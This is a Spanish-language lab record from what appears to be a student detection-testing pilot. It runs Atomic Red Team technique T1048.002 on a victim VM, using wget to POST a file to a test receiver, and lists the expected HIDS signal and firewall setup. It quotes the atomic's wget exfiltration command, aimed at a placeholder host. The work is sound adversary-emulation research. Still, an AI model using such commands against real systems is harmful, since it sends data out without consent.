# ATA008 · T1048 — Exfiltration Over Alternative Protocol (`wget`)

> Artefacto **R-13** del piloto (`fase-03-piloto`). Redactado el **2026-09-25** con los datos
> del **paso 0** y con las señales esperadas **antes de ejecutar nada** (gate humano **validado el 2026-09-25**).
> **No contiene secretos.**

## 1. Identificación

| Campo | Valor |
|---|---|
| ATA | **ATA008** |
| Técnica | **T1048.002 — Exfiltration Over Asymmetric Encrypted Non-C2 Protocol** |
| Táctica | Exfiltration |
| Sistema | Linux (`victima-linux`) |
| Ejecución | usuario `angel`, **sin `sudo`** |

## 2. Fuente de la atómica (Atomic Red Team)

| Campo | Valor |
|---|---|
| Prueba | *Exfiltrate data in a file over HTTPS using wget* |
| **GUID** | `7ccdfcfa-6707-46bc-b812-007ab6ff951c` |
| Path en el clon | `atomics/T1048.002/T1048.002.yaml` |
| Commit pin | `388942adbd9641f4dfdcf079d7efe9a75ec0ac43` |
| Repo | `https://github.com/redcanaryco/atomic-red-team.git` (MIT) |

Comando original (parámetros por defecto: `input_file=…/src/artifact`,
`endpoint_domain=https://example.com/`):

```bash
wget --post-file="#{input_file}" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after
```

## 3. Herramienta fijada en el paso 0 (cierra la señal `T1048-S1`)

Comprobado en la víctima (paso 0): `wget`, `curl` y `python3` **existen**; **no se instala nada**.

| Candidata | Ruta / versión | Decisión |
|---|---|---|
| **`wget`** | `/usr/bin/wget` — **GNU Wget 1.21.4** | **ELEGIDA** (es la herramienta de la atómica) |
| `curl` | `/usr/bin/curl` — 8.5.0 | alternativa (GUID `4a4f31e2-…`, misma técnica) |
| `python3` | `/usr/bin/python3` — 3.12.3 | fallback cero-dependencias (stdlib `urllib`) |

→ La señal esperada queda **`T1048-S1: audit_exe=wget`**.

## 4. Dónde escribe (y dónde NO)

- **No escribe nada** en la víctima (solo lee el fichero y lo envía).
- Hace `POST` del cuerpo a un **receptor HTTP en el HOST/sobremesa**, en la **IP del host en
  VMnet1** fijada en el paso 0: **`http://192.168.65.1:9090/`**.
- El receptor es `Soporte/Ataques/receiver/sink_http.py` (stdlib) y registra cada petición en
  **`sink.log`** (método/ruta/sha256 del cuerpo). **El manager NO ejecuta nada** (es el detector).
- El `input_file` es el artefacto de la propia atómica (`src/artifact`), copiado junto al
  directorio de la técnica.

> **Nota menor (no contradicción):** la atómica usa **HTTPS** con `--no-check-certificate`; el
> receptor del plan (§3) es **HTTP simple** (sin certificados). Se conserva `--no-check-certificate`
> (inerte en HTTP) para mantener la forma del comando. La técnica (T1048.002: exfiltración por
> protocolo alternativo al C2) no cambia.

## 5. Cómo se ejecuta

1. **En el HOST (sobremesa)**, *antes de `t0`*, levantar el receptor con el log de la iteración
   (ver `Soporte/Ataques/receiver/README.md`).
2. (Fase B, tras revert) `scp -r` del directorio `atomics/T1048.002/` a
   `/home/angel/lab-attack/ATA008/` (queda `…/ATA008/src/artifact`).
3. `bash ATA008_ataque.sh` **como `angel`**; imprime `T0=…`/`T1_LOCAL=…` (UTC).
4. Parar el receptor tras `t1`. El `POST` con `sha256` correcto en `sink.log` es la **evidencia
   primaria** de que el dato salió.

## 6. Señales esperadas

`ATA008_esperado.csv`:

- `T1048-S1` (**deteccion**) `audit_exe=wget` — `execve` de `wget` (`80792`).

> La **red no es visible** para el HIDS de host en esta configuración (no hay reglas de
> exfiltración/salida en el ruleset base); por eso la única señal esperada es el proceso.

## 7. Firewall del host (paso 0)

El puerto **9090/tcp** desde la víctima estaba **BLOQUEADO**; se añadió la regla de entrada
acotada al laboratorio:

```text
netsh advfirewall firewall add rule name="TFG-sink-9090" dir=in action=allow ^
  protocol=TCP localport=9090 remoteip=192.168.65.0/24
```

Retest desde la víctima → **OK**; `POST` de prueba → **200** con `sha256` coincidente.
**Retirar la regla al cerrar el piloto** (`netsh advfirewall firewall delete rule name="TFG-sink-9090"`).

## 8. Reversión

Revertir la víctima a **`lab-listo`** (el material copiado desaparece). El manager **no** se revierte.

## 9. Higiene

- Sin contraseñas, claves ni tokens. El ataque se ejecuta como `angel` sin `sudo`.
